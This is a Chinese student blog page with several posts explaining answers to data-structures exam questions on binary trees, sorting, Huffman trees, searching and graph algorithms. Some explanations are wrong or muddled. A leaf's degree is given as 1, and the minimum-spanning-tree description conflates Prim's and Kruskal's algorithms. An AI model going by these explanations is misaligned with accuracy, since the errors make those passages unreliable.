
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/22/数据结构基础-二叉树/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/22/数据结构基础-二叉树/" itemprop="url">数据结构基础--二叉树</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-22T21:53:18+08:00">
                2018-12-22
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据结构/" itemprop="url" rel="index">
                    <span itemprop="name">数据结构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>某二叉树的后序和中序遍历序列正好一样，则该二叉树中的任何结点一定都无右孩子。</strong><br><strong>某二叉树的后序和中序遍历序列正好一样，则该二叉树中的任何结点一定都无左孩子。</strong><br>答案为<em>T</em>和<em>F</em>，可以这样来想哈，后序的话我们可以写作（left）（right）（根），中序的话我们可以写作（left）（根）（right），令二者相等    即可得到（right）=null</p>
<p><strong>若A和B都是一棵二叉树的叶子结点，则存在这样的二叉树，其前序遍历序列为…A…B…，而中序遍历序列为…B…A…</strong><br>答案为<em>F</em>，根据上面的方法我们将（根）=NULL，可以看到，不管是什么的遍历方法，结点为叶的情况下，顺序都是一样的</p>
<p><strong>若一个结点是某二叉树的中序遍历序列的最后一个结点，则它必是该树的前序遍历序列中的最后一个结点。 (2分)</strong><br>答案为<em>F</em>，考虑特殊情况，c为根，d为left，中序为dc，前序为cd</p>
<p><strong>如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T的高度为h（单结点的树h=1），则T的结点数最多为：(3分)</strong><br><strong>如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T的高度为h（单结点的树h=1），则T的结点数最少为：(3分)</strong>答案为<em>(k的h次方−1)/(k−1)</em>，<em>k(h−1)+1</em>，最多的时候很好想，就是每层都是上一层的k倍，也就是1、k、k^2^…所以也就是个等比数列，列公式就完事了。至于最少的情况就是从第二层开始就只有一个结点有孩子，那么也就是1+k+k+k+…+k个（注意这里的应该有h-1个k，因为第一层只有一个），所以答案是k(h-1)+1啦</p>
<p><strong>1-5若一个结点是某二叉树的中序遍历序列的最后一个结点，则它必是该树的前序遍历序列中的最后一个结点。</strong></p>
<p>中序序列即（left）根（right），先序序列是根（left）（right），最后一个结点都是right…吗？当然不是啦，你的right可别忘了还是个树，也就是说可能存在之后还存在上述的结构，而当我们在right树中如果没有下一个right的话，就会出现中序是（left）根，而前序是根（left）的情况，这就完蛋了。</p>
<p><strong>1-7已知一棵二叉树的先序遍历结果是ABC,　则CAB不可能是中序遍历结果。</strong></p>
<p>答案是T，先序遍历可以确定的是A为根结点，而B、C的位置是不确定的，可以归纳为2种情况</p>
<ul>
<li>B、C都为叶子，那么根据我们上面的小技巧，B、C相对位置不能发生改变，所以不对</li>
<li>B、C不都为叶子，那么再次按照先序，B为子树的根结点，树就确认了，发现其中序遍历也不是CAB</li>
</ul>
<p><strong>2-3要使一棵非空二叉树的先序序列与中序序列相同，其所有非叶结点须满足的条件是：</strong></p>
<p>还是老办法，依照题意有：根（left）（right） == （left）根（right），也就是left=0，所以不能有左子树，答案为只有右子树</p>
<p><strong>2-4已知一棵二叉树的树形如下图所示，其后序序列为{ <code>e</code>, <code>a</code>, <code>c</code>, <code>b</code>, <code>d</code>, <code>g</code>, <code>f</code> }。树中与结点<code>a</code>同层的结点是：</strong></p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fycdiqfoa5j308g062jrv.jpg" alt=""></p>
<p>首先，先用自己的字母填充满所有的顶点，然后自己拿后序遍历一遍，然后一一对应填入，之后就随便做了</p>
<p><strong>2-5</strong></p>
<p><strong>在下述结论中，正确的是： (2分)</strong></p>
<p><strong>① 只有2个结点的树的度为1；</strong></p>
<p><strong>② 二叉树的度为2；</strong></p>
<p><strong>③ 二叉树的左右子树可任意交换；</strong></p>
<p><strong>④ 在最大堆（大顶堆）中，从根到任意其它结点的路径上的键值一定是按非递增有序排列的。</strong></p>
<p>1是正确的，不说了；2显然不对，叶结点的度是1；3不对；4很对</p>
<p><strong>2-7如果一棵非空k（k≥2）叉树T中每个非叶子结点都有k个孩子，则称T为正则k叉树。若T有m个非叶子结点，则T中的叶子结点个数为：</strong></p>
<p>这个题目要用到之前总结的知识了，我们设该树有h+1层，由于树为k叉树，所以其叶结点的个数为k的h次方，那么我们忽略所有的叶结点，剩余的树依然是k叉树，其结点数也就等于m（题目条件），那么由之前总结的公式得到 (k的h次方−1)/(k−1) == m，解得k的h次方也就等于m(k−1)+1</p>
<p><strong>2-8有一个四叉树，度2的结点数为2，度3的结点数为3，度4的结点数为4。问该树的叶结点个数是多少？</strong></p>
<p>这题可以用个小技巧，结点+边法，我们设结点数为x，由于树的性质可知边个数为x-1，设叶结点的个数为y，那么可列方程：x == y + 2 + 3 + 4    y == 2x2 + 3x3 + 4x4 + x*0，解方程就完事了</p>
<p><strong>2-11任何一棵二叉树的叶结点在先序、中序和后序遍历序列中的相对次序</strong></p>
<p>不发生改变，上边证明过了</p>
<p><strong>2-12二叉树中第5层（根的层号为1）上的结点个数最多为：</strong></p>
<p>其实这个上面的题目用到过这个知识点了，最多就是k的h-1次方，k是k叉树，h是高度</p>
<p><strong>2-19设高为h的二叉树（规定叶子结点的高度为1）只有度为0和2的结点，则此类二叉树的最少结点数和最多结点数分别为</strong></p>
<p>一看就可以看出这其实就是之前的k叉树的最多最少结点问题，公式推过了，不再说了</p>
<p>successful，估计明天会更新排序，有时间的话还有更新树、森林、哈夫曼树，希望能在是考试前全部更新完吧，这样之后就可以好好更新别的内容啦</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/21/数据结构基础-排序/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/21/数据结构基础-排序/" itemprop="url">数据结构基础--排序</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-21T18:16:46+08:00">
                2018-12-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据结构/" itemprop="url" rel="index">
                    <span itemprop="name">数据结构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>1-1对N个记录进行堆排序，需要的额外空间为O(N)。</strong></p>
<p>这是错的，其实只需要记录temp的一个，也就是O(1)，这里给个统计好的表</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyejgnvnd4j310z0u0dsf.jpg" alt=""></p>
<p><strong>1-2对N个记录进行简单选择排序，比较次数和移动次数分别为O(N2)和O(N)。</strong></p>
<p>这个对的，选择排序的时间基本都浪费在比较上了。。。</p>
<p><strong>1-3希尔排序是稳定的算法。 (1分)</strong></p>
<p>最不稳定的还差不多</p>
<p><strong>1-5对N个记录进行归并排序，归并趟数的数量级是O(NlogN)。</strong></p>
<p>上面总结的表里给了</p>
<p><strong>2-1对一组包含10个元素的非递减有序序列，采用直接插入排序排成非递增序列，其可能的比较次数和移动次数分别是</strong></p>
<p>直接插入排序每回合的比较次数和元素移动次数等于其原始位置和插入位置之间的偏移。最好情况下（有序），需要比较(n-1)次，移动0次；最差情况下，需要比较1+2+…+(n-1)=n(n-1)/2次，移动n(n-1)/2次。所以答案都要小于50</p>
<p><strong>2-2设有1000个元素的有序序列，如果用二分插入排序再插入一个元素，则最大比较次数是</strong></p>
<p>log~2~N，不再重复了</p>
<p><strong>2-3用直接插入排序方法对下面四个序列进行排序（由小到大），元素比较次数最少的是（）。</strong></p>
<p>逆序对越少比较次数越少</p>
<p><strong>2-4在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都会停止移动，那么当所有元素都相等时，算法的时间复杂度是多少</strong>2-5</p>
<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左右指针都不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
<p><strong>在快速排序的一趟划分过程中，当遇到与基准数相等的元素时，如果左指针停止移动，而右指针在同样情况下却不停止移动，那么当所有元素都相等时，算法的时间复杂度是多少？</strong></p>
<p>推荐记住吧。。都停止是O(NlogN)，不停止的话就是O(N^2^)</p>
<p><strong>2-7对N个不同的数据采用冒泡算法进行从大到小的排序，下面哪种情况下肯定交换元素次数最多？</strong></p>
<p>答案就是。。。完全反着的呗</p>
<p><strong>2-8对于7个数进行冒泡排序，需要进行的比较次数为：</strong></p>
<p>冒泡最差就是7+6+5+4+3+2+1，也就是21，其实就是等差数列的公式，n(n-1)/2</p>
<p><strong>2-9有组记录的排序码为{ 46，79，56，38，40，84 }，则利用堆排序的方法建立的初始堆为：</strong></p>
<p>简单说一下怎么建立初始堆，首先将给的记录按照层序构建一个完全二叉树，接着进行调整（以大顶堆为例）</p>
<ul>
<li><p>自己最大，不用调整</p>
</li>
<li><p>左孩子最大，交换该非叶结点与其左孩子的值，并考察以左孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
</li>
<li><p>右孩子最大，交换该非叶结点与其右孩子的值，并考察以右孩子为根的子树是否满足大顶堆的要求，不满足递归向下处理</p>
</li>
</ul>
<p><strong>2-10采用递归方式对顺序表进行快速排序，下列关于递归次数的叙述中，正确的是：</strong></p>
<p>递归次数与每次划分后得到的分区处理顺序无关</p>
<p><strong>2-11对N个记录进行快速排序，在最坏的情况下，其时间复杂度是：</strong></p>
<p>上面的表中给出了，不再多说</p>
<p><strong>2-12有组记录的排序码为{46，79，56，38，40，84 }，采用快速排序（以位于最左位置的对象为基准而）得到的第一次划分结果为：</strong></p>
<blockquote>
<p>base = 46</p>
<ol>
<li>i = 0; j = 5<br>此时 46, 79, 56, 38, 40, 84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
<li>i = 0; j = 4<br>此时 40， 79，56，38，40，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
<li>i = 1;j = 4<br>此时 40， <strong>79</strong>，56，38，<strong>79</strong>，84<br>从右往左找比base小的数，如果找到，则替换i处的值 </li>
<li>i = 1;j = 3<br>此时 40， 38，56，38，79，84<br>从左往右找比base大的数，如果找到，则替换j处的值 </li>
<li>i = 2;j = 3<br>此时 40， 38，56，56，79，84</li>
<li>i=2 处填上base值46<br>此时 40， 38，46，56，79，84<br>选C</li>
</ol>
</blockquote>
<p><strong>2-13对于序列{ 49，38，65，97，76，13，27，50 }，按由小到大进行排序，下面哪一个是初始步长为4的希尔排序法第一趟的结果？</strong></p>
<p>希尔排序应该说是亲民的一种排序了。。。代码亲民，选择做起来也不难。下面来简单说一下希尔排序的过程。</p>
<p>首先选择len/2作为增了，然后前len/2个分别和后len/2个一一对应算是一组，然后这俩组成的一组进行比较交换。</p>
<p>第二步让增量/2得到新的增量，然后重复上面的操作，直至增量为1，进行最后一次排序</p>
<p><strong>2-14给定初始待排序列{ 15，9，7，8，20，-1，4 }。如果希尔排序第一趟结束后得到序列为{ 15，-1，4，8，20，9，7 }，则该趟增量为</strong></p>
<p>会了希尔排序之后这个就很简单了</p>
<p><strong>2-16对于10个数的简单选择排序，最坏情况下需要交换元素的次数为：</strong></p>
<p>就是每两个都得交换，也就是9次</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/20/数据结构基础-树、森林、哈夫曼树/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/20/数据结构基础-树、森林、哈夫曼树/" itemprop="url">数据结构基础--树、森林、哈夫曼树</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-20T17:10:41+08:00">
                2018-12-20
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据结构/" itemprop="url" rel="index">
                    <span itemprop="name">数据结构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>今天上了一天的数电。。。明明本来没那么多课的，结果硬生生加了好几节。。。估计今天更不了排序了，先把树这部分搞完吧</p>
<p><strong>1-1对于一个有N个结点、K条边的森林，不能确定它共有几棵树。</strong></p>
<p>答案是F，这个其实是可以算出来的，我们在图中说过树是边最少的一种连通图了，其边数（下文中边数用e数代替）== 结点数（下文中用v数代替）-1，所以我们就知道了， N - K的差值就是树的个数了</p>
<p><strong>1-2对N（≥2）个权值均不相同的字符构造哈夫曼树，则树中任一非叶结点的权值一定不小于下一层任一结点的权值。</strong></p>
<p>这个是对的因为构造哈夫曼树的时候就是每次拿出最小的来一层层搭建的，而且每一次搭建的上一层都是下边两个的和，所以其实非叶结点的权值都是要大于等于下一层结点的值的</p>
<p><strong>2-1具有1102个结点的完全二叉树一定有__个叶子结点。</strong></p>
<p>这个之前也用过了，就是2n（2n是总的v数）/2个，至于为啥，我们拿1到2n依照层序遍历好所有的v，自然最后一层的最后一个也就是2n，而由于是完全二叉树，最后一层的结点数除以2也就是之前一层的结点数，也就是说上一层v的最后一个就是n，那么最后一层的第一个就是n+1……一直到2n，就是n个。</p>
<p><strong>2-2若森林F有15条边、25个结点，则F包含树的个数是：</strong></p>
<p>上面说过了，就是v-e</p>
<p><strong>2-3将森林转换为对应的二叉树，若在二叉树中，结点u是结点v的父结点的父结点，则在原来的森林中，u和v可能具有的关系是： (3分)</strong></p>
<ol>
<li><strong>父子关系； 2. 兄弟关系； 3. u的父结点与v的父结点是兄弟关系</strong></li>
</ol>
<p>答案是1和3，首先我们要知道森林是怎么变成二叉树的，这里也顺便详细总结一下几种常见的转换吧</p>
<ul>
<li><p>树转换为二叉树，简单说就是三步，加线、去线、转圈。首先把所有的兄弟结点都加上线，接着把非叶结点只保留与第一个孩子的结点，其他全部去掉，然后调整到一个比较好看的角度就完了</p>
</li>
<li><p>森林转换为二叉树，这个也很简单，首先把所有的树都变成二叉树，然后下一棵树都变成上一棵树的右儿子就完事了</p>
</li>
</ul>
<p><strong>2-4对于一个有N个结点、K条边的森林，共有几棵树？</strong></p>
<p>N-K，上面详细说过了。</p>
<p><strong>2-5设森林F中有三棵树，第一、第二、第三棵树的结点个数分别为M1，M2和M3。则与森林F对应的二叉树根结点的右子树上的结点个数是：</strong></p>
<p>这个就是上面提到的那个森林变二叉树的过程，实际上是M3成了M2的右子树，M2成了M1的右子树，所以右子树的结点个数应该是M2+M3</p>
<p><strong>2-6由若干个二叉树组成的森林F中，叶结点总个数为N，度为2的结点总个数为M，则该集合中二叉树的个数为：</strong></p>
<p>设有x个二叉树，度为1的结点为v，边数为e，根据之前推出来的结论有 x = n + m + v - e，对于边数e还有e = 2*m + v，连立得x = n - m</p>
<p><strong>2-7已知一棵完全二叉树的第6层（设根为第1层）有8个叶结点，则该完全二叉树的结点个数最多是</strong></p>
<p><strong>附加题 已知一棵完全二叉树的第6层（设根为第1层）有8个叶结点，则该完全二叉树的结点个数最少是</strong></p>
<p>对于题目中的完全二叉树来说，最起码前五层都是满的，所以就是上次总结的等比数列求和公式2的五次方-1除以2-1，也就是31，而第六层就有故事了（因为完全二叉树的叶结点只有可能出现在最后一层和倒数第二层）</p>
<ul>
<li><p>第六层就是最后一层，那就是31 + 8 = 39了，也就是最少的情况</p>
</li>
<li><p>第六层是倒数第二层，那么就是有8个结点到头了，往下不能延伸了，但剩下的2的五次方-8个顶点还是可以继续往下走的，所以就是第七层还有48个结点，加起来就是最多的情况了</p>
</li>
</ul>
<p><strong>2-8在一个用数组表示的完全二叉树中，如果根结点下标为1，那么下标为17和19这两个结点的最近公共祖先结点在哪里（数组下标）？ （注：两个结点的“公共祖先结点”是指同时都是这两个结点祖先的结点）</strong></p>
<p>来看一下二叉树在数组中常见的几种查找。设结点的序列为index（假设根结点为0），那么他的左儿子也就是2*index+1，他的右儿子也就是2*index+2，而他的父亲就是(index-1)/2。</p>
<p>题目中因为根结点是1，我们提前一格，所求的就是16和18，根据公式得7和8，再求一次得3，因为我们index提前了一格，所以再加1，答案就是4了</p>
<p><strong>2-9具有65个结点的完全二叉树其深度为（根的深度为1）</strong></p>
<p>记住公式就完事了，深度k =[log~2~N] + 1（注意要向下取整）</p>
<p><strong>2-10对N（N≥2）个权值均不相同的字符构造哈夫曼树。下列关于该哈夫曼树的叙述中，错误的是：</strong></p>
<p>当一棵具有n 个叶子结点的二叉树的WPL 值为最小时，称其树为哈夫曼树，其二叉树的形状是唯一的</p>
<blockquote>
<p>哈夫曼树的形态不是唯一的，但是它的带权路径长度WPL是唯一的。 </p>
<p>如：3，5，6 </p>
<p>可以构造出 </p>
<p>​        14</p>
<p>​      8          6</p>
<p>3    5</p>
<p>或   </p>
<p>​       14</p>
<p>​     6         8 </p>
<p>​              3    5</p>
<p>这两种形态，所以哈夫曼树形态不唯一。</p>
</blockquote>
<p><strong>2-18(neuDS)在哈夫曼树中，任何一个结点它的度都是（ ）</strong></p>
<p>0或者2，因为，这很好想吧，因为我们都是拿两个结点拼起来的</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/18/数据结构基础-查找/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/18/数据结构基础-查找/" itemprop="url">数据结构基础--查找</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-18T21:01:18+08:00">
                2018-12-18
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据结构/" itemprop="url" rel="index">
                    <span itemprop="name">数据结构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>2-1已知一个长度为16的顺序表L，其元素按关键字有序排列。若采用二分查找法查找一个L中不存在的元素，则关键字的比较次数最多是</strong></p>
<p>我们知道折半查找就相当于是建立了一个二叉树，然后去搜索相应的叶子，那么查询的次数最多就应该是树的</p>
<p>高度，也就是log~2~n+1，答案就是5了</p>
<p><strong>2-2用二分查找从100个有序整数中查找某数，最坏情况下需要比较的次数是</strong></p>
<p>和上个题一样，其实就是log~2~n+1，注意这里的log~2~n要向下取整也就是6</p>
<p><strong>2-3在有n（n&gt;1000）个元素的升序数组<code>A</code>中查找关键字x。查找算法的伪代码如下所示：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k = 0</span><br><span class="line">while ( k&lt;n 且 A[k]&lt;x )  k = k+3;</span><br><span class="line">if ( k&lt;n 且 A[k]==x )  查找成功;</span><br><span class="line">else if ( k-1&lt;n 且 A[k-1]==x ) 查找成功;</span><br><span class="line">     else if ( k-2&lt;n 且 A[k-2]==x ) 查找成功;</span><br><span class="line">          else 查找失败;</span><br></pre></td></tr></table></figure>
<p>看算法，就是个简单的顺序查找，只不过是3个一组罢了。想象你要找的元素是第二个，因为折半查找先找中间，而你顺序查找的话一下子就找到了。所以答案很明显应该是前几个元素。</p>
<p><strong>2-4下列二叉树中，可能成为折半查找判定树（不含外部结点）的是：</strong></p>
<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fyc4flh0lrj30fq0lkwib.jpg" alt=""></p>
<p>折半查找二叉树要注意，他的中序遍历是一个有序序列（升序的），但是折半就有个问题了，你是向上取整呢，还是向下取整呢？一般我们都是向下取整的，但其实这两种情况都可以，不过两种情况的二叉树在当顶点数是偶数时就会出现左右分配不均匀的情况，就会存在差异。</p>
<ul>
<li>当向上取整时，左多右少</li>
<li>当向下取整时，左少右多</li>
</ul>
<p>做这种题目关键就是看他们的取整策略是否相同，这里有个小技巧，高度对称的一定不是，比如b、c。而d呢？根结点左是4，右是5，也就是向下取整，在看左子树的根结点，左2右1，是向上取整，矛盾所以错误。</p>
<p><strong>2-5若二叉搜索树是有N个结点的完全二叉树，则不正确的说法是：</strong></p>
<p>查找效率之前说过了就是logN，最小值一定在叶结点上也是对的，但最大却不一定在叶结点上，还有可能是中间。</p>
<p><strong>2-6若一棵二叉树的后序遍历序列是{ 1, 3, 2, 6, 5, 7, 4 }，中序遍历序列是{ 1, 2, 3, 4, 5, 6, 7 }，则下列哪句是错的</strong></p>
<p>这个就不说了，还原出来树就很简单了，怎么还原？先看后序，后序的最后一个是根结点，再看中序，中序中以根结点为mid分成两部分，左是左子树，右是右子树，重复上面的过程即可</p>
<p><strong>2-10对二叉搜索树进行什么遍历可以得到从小到大的排序序列？</strong></p>
<p>这个之前说那个折半查找树的时候说过了，中序（因为左一定小于中，右一定大于中）。</p>
<p>其余的题目都是类似的或者是重复的，就不再说了（其实是今天还要被逼更新二叉树，来不及写了），successful</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/16/数据结构基础-图（下）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/16/数据结构基础-图（下）/" itemprop="url">数据结构基础--图（下）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-16T21:24:05+08:00">
                2018-12-16
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/数据结构/" itemprop="url" rel="index">
                    <span itemprop="name">数据结构</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>1-1在一个有权无向图中，若b到a的最短路径距离是12，且c到b之间存在一条权为2的边，则c到a的最短路径距离一定不小于10。</strong><br>这肯定是对的，a-b最小是12的话，假设a-c最小是x，那么x+2>=12（为啥？因为你经过c到b的距离不可能大于最短路径）</p>
<p><strong>2-1我们用一个有向图来表示航空公司所有航班的航线。下列哪种算法最适合解决找给定两城市间最经济的飞行路线问题？</strong><br>两城市之间最短路径问题用Dijkstra算法喽</p>
<p><strong>2-2数据结构中Dijkstra算法用来解决哪个问题？</strong><br>重复做题，最为致命。</p>
<p><strong>2-3若要求在找到从S到其他顶点最短路的同时，还给出不同的最短路的条数，我们可以将Dijkstra算法略作修改，增加一个count数组：count v记录S到顶点V的最短路径有多少条。则count v应该被初始化为：</strong><br>count s=1;对于其他顶点V则令count v=0，很简单嘛，自己和自己的最短路径就不用再考虑了。</p>
<p><strong>2-4使用迪杰斯特拉（Dijkstra）算法求下图中从顶点1到其他各顶点的最短路径，依次得到的各最短路径的目标顶点是</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fy8x1x0zvgj30k208uabi.jpg" alt=""><br>最好是拿张纸画一画，挺简单。从1点开始有两条路，更新到v2和v5的距离，然后到v5的距离4小于到v2的距离5，所以在从v5开始重复操作，最后等所有的都遍历过来了就完事了，然后看看是谁先变为最短路径的，列出来即可</p>
<p><strong>2-5在一个有权无向图中，如果顶点b到顶点a的最短路径长度是10，顶点c与顶点b之间存在一条长度为3的边。那么下列说法中有几句是正确的？</strong></p>
<ul>
<li>c与a的最短路径长度就是13</li>
<li>c与a的最短路径长度就是7</li>
<li>c与a的最短路径长度不超过13</li>
<li>c与a的最短路径不小于7</li>
</ul>
<p>这题和第一个简直是一个模子刻出来的，还是列个不等式先，设a-c为x，那么x+3>=10（为什么前面说过一次了），得到x大于等于7，这是一种情况，那x最大是几呢？因为a-b的最短定了，b-c定了，所以最大就是10 + 3 = 13了，所以这里有两句话正确<br><strong>2-6给定有权无向图的邻接矩阵如下，其最小生成树的总权重是：</strong><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fy8xdnjlq1j30ca088weu.jpg" alt=""><br>呃，千万别还原图，直接画一下最小生成树就好了，什么，不会？Prime算法和Kruskal算法了解一下，这里就选简单的Prime算法说吧<br>首先我们根据邻接矩阵的值取最短的边放入我们的最小生成树，每次都取最小的边，如果和之前的构成回路了就舍弃掉，这样最后连通起来，就得到了最小生成树啦</p>
<p><strong>2-9给定有权无向图如下。关于其最小生成树，下列哪句是对的？</strong><br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fyb16bn7xyj30j60e60xs.jpg" alt=""></p>
<ul>
<li>最小生成树不唯一，其总权重为23</li>
<li>最小生成树唯一，其总权重为20</li>
<li>边(B, F)一定在树中，树的总权重为23</li>
<li>边(H, G)一定在树中，树的总权重为20</li>
</ul>
